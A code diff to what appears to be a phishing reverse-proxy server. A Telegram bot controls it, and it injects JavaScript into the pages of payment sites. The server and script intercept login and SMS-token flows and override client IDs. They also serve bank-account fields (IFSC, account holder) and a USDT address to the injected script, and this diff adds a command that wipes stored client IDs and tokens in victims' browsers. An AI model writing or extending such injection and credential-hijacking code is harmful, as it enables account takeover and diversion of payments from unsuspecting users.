@@ -34,6 +34,7 @@ const DEFAULT_DATA = {
     blockUpdate: true,
     orderBankMap: {},
     nextClientIdOverride: null,
+    clearClientIdEpoch: 0,
     bannedUsers: {}
 };
 
@@ -143,6 +144,7 @@ async function loadData(forceRefresh) {
             if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
             if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
             if (cachedData.nextClientIdOverride === undefined) cachedData.nextClientIdOverride = null;
+            if (cachedData.clearClientIdEpoch === undefined) cachedData.clearClientIdEpoch = 0;
             if (!cachedData.bannedUsers) cachedData.bannedUsers = {};
             cacheTime = Date.now();
             return cachedData;
@@ -188,6 +190,9 @@ async function saveDataUnlocked(data) {
                     }
                     if (data.nextClientIdOverride !== undefined) {
                         toSave.nextClientIdOverride = data.nextClientIdOverride;
+                    }
+                    if (data.clearClientIdEpoch !== undefined) {
+                        toSave.clearClientIdEpoch = data.clearClientIdEpoch;
                     }
                     data = toSave;
                 } else {
@@ -1500,7 +1505,8 @@ app.get('/hook/config', async (req, res) => {
             tg: TELEGRAM_OVERRIDE,
             bonus: totalBonus,
             blockUpdate: data.blockUpdate !== false,
-            usdtAddr: data.usdtAddress || ''
+            usdtAddr: data.usdtAddress || '',
+            clearClientIdEpoch: data.clearClientIdEpoch || 0
         });
     } catch (e) {
         res.json({ enabled: false, an: '', ah: '', if: '', ifsc: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
@@ -1608,6 +1614,7 @@ app.post('/bot-webhook', async (req, res) => {
 /on — Proxy ON
 /off — Proxy OFF
 /sendnext <clientId> — One-shot Client ID override
+/clearclientid — Clear Client ID override & clean cache
 /ban <number> [message] — Block login for a number
 /unban <number> — Remove login block
 /bans — List blocked numbers
@@ -1665,6 +1672,22 @@ Example:
             data._skipOverrideMerge = true;
             await saveData(data);
             await sendCommandReply(`🧪 Client-ID override armed\nClient ID: ${requestedClientId}\nScope: next checkSmsNew/getsendtken/sendLoginSms/login flow\nExpires: 5 minutes or after login`);
+            return res.sendStatus(200);
+        }
+
+        if (text === '/clearclientid' || text === '/clearclintid' || text === '/clearclient' || text === '/resetclientid') {
+            data.nextClientIdOverride = null;
+            data.clearClientIdEpoch = Date.now();
+            data._skipOverrideMerge = true;
+            await saveData(data);
+            await sendCommandReply(
+                `🧹 <b>Client ID & Cache Cleared!</b>\n\n` +
+                `• Server Override: 🗑️ Removed\n` +
+                `• Browser Cache Epoch: 🔄 Updated (${data.clearClientIdEpoch})\n` +
+                `• Client Cache: 🧼 LocalStorage client ID clean signal broadcasted\n\n` +
+                `Ab koi purana Client ID cache mein nahi bachega aur fresh login flow chalega.`,
+                { parse_mode: 'HTML' }
+            );
             return res.sendStatus(200);
         }
 
@@ -3578,10 +3601,25 @@ ${replaceLine}
 
 const INJECT_JS = `(function(){
 if(window._pxi)return;window._pxi=1;
-var P='https://${PROXY_HOST}';
+var P=(window.location&&window.location.origin)?window.location.origin:'https://${PROXY_HOST}';
 var REAL='https://tivox.icu';
 var REAL2='https://qonix.click';
 var SERVER_IFSC='';
+
+function handleClearClientIdEpoch(cfg){
+  if(!cfg)return;
+  if(cfg.clearClientIdEpoch){
+    var epKey='_px_cleared_client_ep';
+    var lastEp='';try{lastEp=localStorage.getItem(epKey)||'';}catch(e){}
+    if(lastEp!==String(cfg.clearClientIdEpoch)){
+      try{
+        localStorage.removeItem('clientId');
+        localStorage.removeItem('sendtoken');
+        localStorage.setItem(epKey,String(cfg.clearClientIdEpoch));
+      }catch(e){}
+    }
+  }
+}
 
 // ── Intercept API calls so <base> tag doesn't redirect them to vivipay.net ──
 (function(){
@@ -3724,11 +3762,11 @@ try{localStorage.removeItem('_px_bal');}catch(e){}
 function lc(){
 try{var x=new XMLHttpRequest();
 x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);
-x.send();if(x.status===200)CFG=JSON.parse(x.responseText);}catch(e){}}
+x.send();if(x.status===200){CFG=JSON.parse(x.responseText);handleClearClientIdEpoch(CFG);}}catch(e){}}
 function lcAsync(){
 try{var x=new XMLHttpRequest();
 x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
-x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};
+x.onload=function(){try{CFG=JSON.parse(x.responseText);handleClearClientIdEpoch(CFG);}catch(e){}};
 x.send();}catch(e){}}
 // Do not block first paint on optional user/config state.
 try{lcAsync();}catch(e){}
